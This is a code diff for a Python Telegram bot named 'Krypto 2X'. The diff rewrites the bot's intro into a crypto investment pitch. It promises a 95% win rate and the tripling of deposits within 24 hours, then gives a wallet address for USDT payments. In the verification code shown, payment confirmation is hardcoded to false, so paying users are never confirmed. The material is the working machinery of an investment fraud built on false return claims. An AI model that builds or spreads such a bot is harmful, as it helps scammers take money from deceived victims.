@@ -26,23 +26,42 @@ SHOW_ADDRESS, WAIT_FOR_TXID = range(2)
 # TELEGRAM BOT LOGIC
 # ==========================================
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Step 1: Explain the rules."""
-    rules_text = (
-        "Welcome to Krypto 2X 🚀\n\n"
-        "Here are the rules:\n"
-        "1. You will receive [Insert Digital Good/Service].\n"
-        "2. Payments are strictly in USDT (TRC20).\n"
-        "3. Access is granted automatically upon verification.\n\n"
-        "Do you agree and wish to proceed?"
+    """Step 1: Explain the bot and ask for agreement."""
+    intro_text = (
+        "🚀 *Krypto 2X: Binary Trading Bot with 95% Win Rate* 🚀\n\n"
+        "✨ *What is Krypto 2X?*\n"
+        "A fully automated binary trading bot designed to *triple your money in 24 hours* 💸. With a *95% win rate*, it’s a reliable tool for maximizing returns.\n\n"
+        "💼 *How It Works*\n"
+        "1. *Deposit Funds* 💼\n"
+        "   Transfer your money to the bot’s wallet. No manual steps required!\n\n"
+        "2. *Automated Trading* 🤖\n"
+        "   The bot instantly sends funds to Quotex and starts trading. *No human intervention* involved—just pure algorithmic precision.\n\n"
+        "3. *Profit Distribution* 📈\n"
+        "   Once the bot achieves *3x returns*, it automatically:\n"
+        "   - *Sends our fee* to our wallet address 📦\n"
+        "   - *Returns your original funds* to your designated address 🔄\n"
+        "   - *Transfers the profit* back to you 💰\n\n"
+        "🌟 *Why Choose Krypto 2X?*\n"
+        "✅ *95% win rate* for consistent performance.\n"
+        "✅ *24-hour tripling* of your investment.\n"
+        "✅ *Transparent process*—no hidden fees or delays.\n"
+        "✅ *Fully automated*—set it and forget it!\n\n"
+        "🤝 *Our Team’s Role*\n"
+        "We monitor transactions and profits in real-time, but *no real person* is involved in the trading process. It’s all handled by the bot.\n\n"
+        "💡 *Result?*\n"
+        "You get *3x your money* in 24 hours, with *fees deducted* and *original funds returned*—smooth, fast, and secure!\n\n"
+        "📈 *Ready to Level Up?*\n"
+        "Let’s get your money working for you! 💼✨\n\n"
+        "👇 *Click below to agree and get the deposit address.*"
     )
     keyboard = [[InlineKeyboardButton("I Agree - Show Address", callback_data="agree")]]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
     # Handle both new /start commands and restarting from existing prompts
     if update.message:
-        await update.message.reply_text(rules_text, reply_markup=reply_markup)
+        await update.message.reply_text(intro_text, reply_markup=reply_markup, parse_mode='Markdown')
     else:
-        await update.callback_query.message.reply_text(rules_text, reply_markup=reply_markup)
+        await update.callback_query.message.reply_text(intro_text, reply_markup=reply_markup, parse_mode='Markdown')
         
     return SHOW_ADDRESS
 
@@ -51,10 +70,11 @@ async def show_address(update: Update, context: ContextTypes.DEFAULT_TYPE) -> in
     query = update.callback_query
     await query.answer()
     
+    # Updated to single asterisks for Telegram Markdown compatibility
     msg = (
-        f"Please send exactly **{EXPECTED_AMOUNT} USDT (TRC20)** to this address:\n\n"
+        f"Please send exactly *{EXPECTED_AMOUNT} USDT (TRC20)* to this address:\n\n"
         f"`{USDT_ADDRESS}`\n\n"
-        "Once you have sent the payment, please **paste your Transaction ID (TxHash)** below so I can verify it."
+        "Once you have sent the payment, please *paste your Transaction ID (TxHash)* below so I can verify it."
     )
     
     keyboard = [[InlineKeyboardButton("❌ Cancel", callback_data="cancel")]]
@@ -77,7 +97,7 @@ async def verify_txid(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int
     payment_verified = False 
     
     if payment_verified:
-        await wait_msg.edit_text("✅ Payment Confirmed! Here is your access link/file: [LINK]")
+        await wait_msg.edit_text("✅ Payment Confirmed! Your bot is now being configured.")
         return ConversationHandler.END
     else:
         await wait_msg.edit_text(
@@ -90,7 +110,7 @@ async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     """Cancels and ends the conversation."""
     query = update.callback_query
     await query.answer()
-    await query.edit_message_text(text="Payment cancelled. Type /start to try again.")
+    await query.edit_message_text(text="Process cancelled. Type /start to try again.")
     return ConversationHandler.END
 
 # ==========================================
